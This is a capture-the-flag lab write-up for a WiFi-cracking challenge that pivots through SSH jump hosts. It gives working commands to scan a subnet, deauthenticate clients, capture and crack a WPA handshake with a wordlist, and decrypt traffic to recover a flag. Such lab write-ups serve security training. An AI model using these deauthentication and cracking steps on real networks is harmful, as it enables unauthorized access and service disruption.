# d582aa_wifi_cracking_1


According to the last 21077e_cloud_hacking_1 challege, we got ip address and the private key.

```
cd ../21077e_cloud_hacking_1/en2720-2017-2023-en2720-w1-8da680b871c76380dc3522ce3c4cc127c713

```

find the target
```
nohup nmap --top-ports 1000 10.0.7.0/24 > result.txt &
ftp 10.0.7.178
> SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7
```


connect to the target
```
# use the en2720-w1-cloud-hopper machine as a jump server
ssh -i wifi-ssh-key cereal_killer@10.0.7.178 -p 21 -o ProxyCommand='ssh -i ../id_rsa_root root@10.0.7.127 -p 52961 -W %h:%p'

```

capture the wifi traffic
```
iwconfig
sudo airmon-ng start sta3-wlan0
sudo airodump-ng sta3-wlan0mon # get BSSID and channel
sudo airodump-ng --bssid 50:B0:19:AE:21:EF -c 1 --write new-york sta3-wlan0mon # when there is handshake, press ctrl+c
sudo aireplay-ng --deauth 200 -a 50:B0:19:AE:21:EF sta3-wlan0mon # on another terminal

# crack the password
sudo aircrack-ng -b 50:B0:19:AE:21:EF new-york-01.cap -w /usr/share/wordlists/rockyou.txt
KEY FOUND! [ superman ]
```

transfer data between the wifi server and kali 
```
# scp doesn't work, why?
scp -o ProxyCommand='ssh -i ../id_rsa_root root@10.0.7.127 -p 52961 -W %h:%p' -P 21 -i wifi-ssh-key cereal_killer@10.0.7.128:/home/cereal_killer/new-york-01.cap . 


# kali, local port forwarding
ssh -N -L 1234:10.0.7.178:21 -i ../id_rsa_root root@10.0.7.127 -p 52961
scp -P 1234 -i wifi-ssh-key cereal_killer@localhost:/home/cereal_killer/new-york-01.cap  .
```

decrypt the wifi traffic, https://miloserdov.org/?p=2525
```
key: wpa-pwd value: superman:new-york
# first search `eapol`, then find one tcp packet in the following packet
# follow -> tcp stream, you will see the base64 encoded data
ZmxhZ3tkNTgyYWFlMjk5Y2YwMzAyZDkwNDAwZjRiOTg3Yzc1OTdhMmI5ODZhOTk5MDYxfQ==

flag{d582aae299cf0302d90400f4b987c7597a2b986a999061}
```



